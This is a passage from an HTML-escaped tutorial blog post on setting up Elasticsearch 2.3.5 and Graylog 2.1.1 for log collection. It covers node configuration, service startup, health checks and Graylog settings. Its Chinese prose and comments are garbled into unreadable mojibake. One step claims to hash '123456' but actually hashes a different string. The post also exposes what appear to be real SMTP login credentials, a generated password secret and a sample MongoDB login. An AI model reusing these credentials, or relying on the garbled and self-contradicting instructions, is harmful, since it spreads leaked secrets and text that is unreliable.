class=&quot;comment&quot;&gt;#é›†ç¾¤åç§°å»ºè®®å‘½ågraylogï¼Œä¾¿äºè¯†åˆ«åŒºåˆ†&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;node.name: elasticsearch-node-1     &lt;span class=&quot;comment&quot;&gt;# elasticsearché›†ç¾¤èŠ‚ç‚¹åç§°&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;network.host: 192.168.1.234    &lt;span class=&quot;comment&quot;&gt;# ç»‘å®šèŠ‚ç‚¹IP&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http.port: 9200         &lt;span class=&quot;comment&quot;&gt;# å¤–éƒ¨è®¿é—®ç«¯å£ï¼Œé»˜è®¤ï¼Œä¹Ÿå¯ä»¥å®‰å…¨è€ƒè™‘ä¿®æ”¹&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path.logs: /home/data/logs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path.data: /home/data/es-data&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.multicast.enabled: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;#å¤šæ’­å‘ç°æ–¹å¼å…³é—­ï¼Œå› ä¸ºgraylogé‡‡ç”¨å•æ’­æ–¹å¼å‘ç°elasticsearché›†ç¾¤æ–¹å¼&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.unicast.hosts                   &lt;span class=&quot;comment&quot;&gt;#å¤šä¸ªèŠ‚ç‚¹ç”¨é€—å·éš”å¼€&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.minimum_master_nodes: 3    &lt;span class=&quot;comment&quot;&gt;# elasticsearché›†ç¾¤èŠ‚ç‚¹ï¼Œæœ€å°‘é€‰ä¸¾æ•°ï¼Œè¿™ä¸ªæ•°ä¸€å®šè¦è®¾ç½®ä¸ºæ•´ä¸ªé›†ç¾¤èŠ‚ç‚¹ä¸ªæ•°çš„ä¸€åŠåŠ 1ï¼Œå³N/2+1ï¼Œå¿…é¡»ä¸ºå¥‡æ•°&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(4)å¯åŠ¨elasticsearchæœåŠ¡&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ–°å»ºä¸€ä¸ªelasticsearchç”¨æˆ·ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼ŒelasticsearchæœåŠ¡ä¸èƒ½ä½¿ç”¨rootç”¨æˆ·å¯åŠ¨&lt;/p&gt;
&lt;p&gt;åˆ›å»ºelasticsearchç”¨æˆ·ç»„åŠelasticsearchç”¨æˆ·ï¼Œæ‰§è¡Œ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;groupadd elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;useradd elasticsearch -g elasticsearch -p elasticsearch&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å…¶ä¸­-gä½¿ç”¨æˆ·å±äºæŸä¸ªç»„ï¼Œ-pä¸ºæ–°ç”¨æˆ·ä½¿ç”¨åŠ å¯†å¯†ç ï¼‰&lt;br&gt;æ›´æ”¹elasticsearch-2.3.5æ–‡ä»¶å¤¹åŠå†…éƒ¨æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·åŠç»„ä¸ºelasticsearch:elasticsearch&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;chown -R elasticsearch:elasticsearch  /home/data/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;chown -R elasticsearch:elasticsearch  elasticsearch-2.3.5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åˆ‡æ¢ç”¨æˆ·&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;su elasticsearch&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åœ¨elasticsearch-2.3.5/binç›®å½•ä¸‹æ‰§è¡Œ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[elasticsearch@graylog bin]$ ps -ef | grep elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root     18265 16004  0 14:27 pts/1    00:00:00 su elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;502      18405     1 62 14:27 pts/1    00:00:13 /srv/jdk1.8.0_66/bin/java -Xms256m -Xmx1g -Djava.awt.headless=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt; -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -XX:+DisableExplicitGC -Dfile.encoding=UTF-8 -Djna.nosys=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt; -Des.path.home=/opt/elasticsearch-2.3.5 -cp /opt/elasticsearch-2.3.5/lib/elasticsearch-2.3.5.jar:/opt/elasticsearch-2.3.5/lib/* org.elasticsearch.bootstrap.Elasticsearch start &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;502      18530 18266  0 14:27 pts/1    00:00:00 grep --color=auto ela&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(5)æ£€æŸ¥elasticsearchæœåŠ¡çŠ¶æ€&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æµ‹è¯•Elasticsearchæ˜¯å¦æ­£å¸¸è¿è¡Œï¼š&lt;/p&gt;
&lt;p&gt;$ curl -XGET â€˜&lt;a href=&quot;http://localhost:9200/_cluster/health?pretty=true&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost:9200/_cluster/health?pretty=true&lt;/a&gt;â€˜&lt;/p&gt;
&lt;p&gt;è¾“å‡ºçš„ä¿¡æ¯å¦‚ä¸‹è¡¨ç¤ºElasticsearchå®‰è£…æˆåŠŸï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[elasticsearch@graylog bin]$ curl -XGET &lt;span class=&quot;string&quot;&gt;&#39;http://192.168.1.234:9200/_cluster/health?pretty=true&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;graylog&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;status&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;yellow&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;timed_out&quot;&lt;/span&gt; : &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_nodes&quot;&lt;/span&gt; : 1,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_data_nodes&quot;&lt;/span&gt; : 1,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;active_primary_shards&quot;&lt;/span&gt; : 30,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;active_shards&quot;&lt;/span&gt; : 30,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;relocating_shards&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;initializing_shards&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;unassigned_shards&quot;&lt;/span&gt; : 30,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;delayed_unassigned_shards&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_pending_tasks&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_in_flight_fetch&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;task_max_waiting_in_queue_millis&quot;&lt;/span&gt; : 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;active_shards_percent_as_number&quot;&lt;/span&gt; : 50.0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3ï¼šå®‰è£…éƒ¨ç½²graylog-2-1ç‰ˆæœ¬&quot;&gt;&lt;a href=&quot;#3ï¼šå®‰è£…éƒ¨ç½²graylog-2-1ç‰ˆæœ¬&quot; class=&quot;headerlink&quot; title=&quot;3ï¼šå®‰è£…éƒ¨ç½²graylog-2.1ç‰ˆæœ¬&quot;&gt;&lt;/a&gt;3ï¼šå®‰è£…éƒ¨ç½²graylog-2.1ç‰ˆæœ¬&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;(1)ä¸‹è½½å®‰è£…åŒ…&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;wget https://packages.graylog2.org/releases/graylog/graylog-2.1.1.tgz&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(2)è§£å‹å®‰è£…åŒ…&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;tar -zxvf graylog-2.1.1.tgz -C /opt/.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(3)ä¿®æ”¹é…ç½®æ–‡ä»¶&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹å®‰è£…ç›®å½•ä¸‹ graylog.conf.example æ–‡ä»¶&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vim graylog.conf.example&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;web_listen_uri å€¼æ˜¯graylogå¯åŠ¨æˆåŠŸåï¼ŒwebæœåŠ¡è®¿é—®åœ°å€&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;web_listen_uri = http://192.168.1.234:9000/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;rest_listen_uri çš„å€¼ï¼Œæ˜¯graylogå¯åŠ¨æˆåŠŸåï¼Œapiè®¿é—®åœ°å€&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;rest_listen_uri = http://192.168.1.234:9000/api/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;root_timezone = UTC  #è®¾ç½®æ—¶åŒºï¼Œå¦åˆ™é»˜è®¤ä½¿ç”¨çš„æ˜¯UTCæ—¶é—´ä¹Ÿå°±æ˜¯ä¸–ç•Œæ—¶é—´ è¿™é‡Œæ˜¯å¿…é¡»æ”¹ä¸‹çš„ï¼Œå› ä¸ºåæœŸæ”¶é›†æ—¥å¿—æ˜¾ç¤ºæ—¶é—´æ˜¯æœ‰å˜åŒ–çš„ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;root_timezone = Asia/Shanghai&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å…¶ä¸­ password_secret çš„å€¼ç”¨å‘½ä»¤ç”Ÿæˆ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum install -y pwgen&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pwgen -N 1 &lt;span class=&quot;_&quot;&gt;-s&lt;/span&gt; 96       H1R5v17kWtyDxj2PzxLMxu41D6HDt9JzhfZcj6QlCURVddgkLAdnUmpkdIscmmu4ELKsTrHwKvPmxFKSYyTn0YlqebbpQqyr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    password_secret = H1R5v17kWtyDxj2PzxLMxu41D6HDt9JzhfZcj6QlCURVddgkLAdnUmpkdIscmmu4ELKsTrHwKvPmxFKSYyTn0YlqebbpQqyr&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å…¶ä¸­root_password_sha2 çš„å€¼ä½¿ç”¨å‘½ä»¤ç”Ÿæˆ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; -n Ihaozhuo_b313 | sha256sum  (è¿™é‡Œå¯¹å¯†ç 123456å“ˆå¸ŒåŠ å¯†)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;fc&lt;/span&gt;88c28d48b0cb97f3fb5286cc35c520409ef037acd30ec687f0c0bd3d5a5115 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root_password_sha2 = &lt;span class=&quot;built_in&quot;&gt;fc&lt;/span&gt;88c28d48b0cb97f3fb5286cc35c520409ef037acd30ec687f0c0bd3d5a5115&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elasticsearch_cluster_name å€¼å¿…é¡»æ˜¯elasticsearché…ç½®æ–‡ä»¶ä¸­çš„cluster_name&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch_cluster_name = graylog&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elasticsearch_discovery_zen_ping_unicast_hosts å¡«å†™elasticsearchåœ°å€ï¼Œå¦‚æœæ˜¯å¤šä¸ªï¼Œç”¨é€—å·éš”å¼€&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch_discovery_zen_ping_unicast_hosts = 192.168.1.234:9300&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elasticsearch_discovery_zen_ping_multicast_enabled = false å¤šæ’­æ¨¡å¼å…³é—­&lt;/p&gt;
&lt;p&gt;ç”±äºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªElasticsearch shardï¼Œéœ€è¦æŠŠelasticsearch_shardså‚æ•°è®¾ç½®ä¸º1ï¼š&lt;br&gt;elasticsearché›†ç¾¤åˆ†ç‰‡æ•°é‡&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch_shards = 1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elasticsearchç»‘å®šçš„èŠ‚ç‚¹IP&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;299 elasticsearch_network_host = 192.168.1.234&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;300 elasticsearch_network_bind_host = 192.168.1.234&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;301 elasticsearch_network_publish_host = 192.168.1.234&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;mongodbå®‰è£…æœåŠ¡çš„ipåœ°å€&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mongodb_uri = mongodb://192.168.1.234/graylog&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™é‡Œmongodbæ˜¯å®‰è£…åœ¨æˆ‘åŒä¸€å°æœåŠ¡å™¨ä¸Šé¢çš„ã€‚å¦‚æœè¦æŠŠmongodbå•ç‹¬æœåŠ¡å™¨è·‘è¿æ¥æ–¹å¼é…ç½®æ–‡ä»¶é‡Œé¢ä¹Ÿæœ‰ä¾‹å­è¯´æ˜ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mongodb_uri =mongodb://graylog:123456@160.17.2.251:27017/graylog2             &lt;span class=&quot;comment&quot;&gt;#è¿æ¥åˆ°mongodbçš„æœåŠ¡å™¨åœ°å€ä¸º160.17.2.251:27017ï¼Œè´¦å·ä¸ºgraylogï¼Œå¯†ç ä¸º123456 æ•°æ®åº“ä¸ºgraylog2&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt; è®¾ç½®å‘Šè­¦é‚®ä»¶å‘é€è€…ä¿¡æ¯&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;# Email transport&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_enabled = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_hostname = smtp.exmail.qq.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_port = 465&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_use_auth = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_use_tls = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_use_ssl = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_auth_username = chengyangyang@qq.cn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_auth_password = beneTqq&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_subject_prefix = [graylog]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_from_email = chengyangyang@qq.cn&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(4)å¤åˆ¶é…ç½®æ–‡ä»¶&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; å› ä¸ºgraylogå®‰è£…binç›®å½•ä¸‹ï¼Œé»˜è®¤å¯åŠ¨é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;é…ç½®æ–‡ä»¶è·¯å¾„ï¼š&lt;code&gt;/etc/graylog/server/server.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥éœ€è¦å°†&lt;code&gt;graylog.conf.example&lt;/code&gt; å¤åˆ¶åˆ°&lt;code&gt;/etc/graylog/server/&lt;/code&gt;ç›®å½•ä¸‹ï¼Œå¹¶ä¸”æ”¹å &lt;code&gt;server.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œå‘½ä»¤ï¼š&lt;/p&gt;
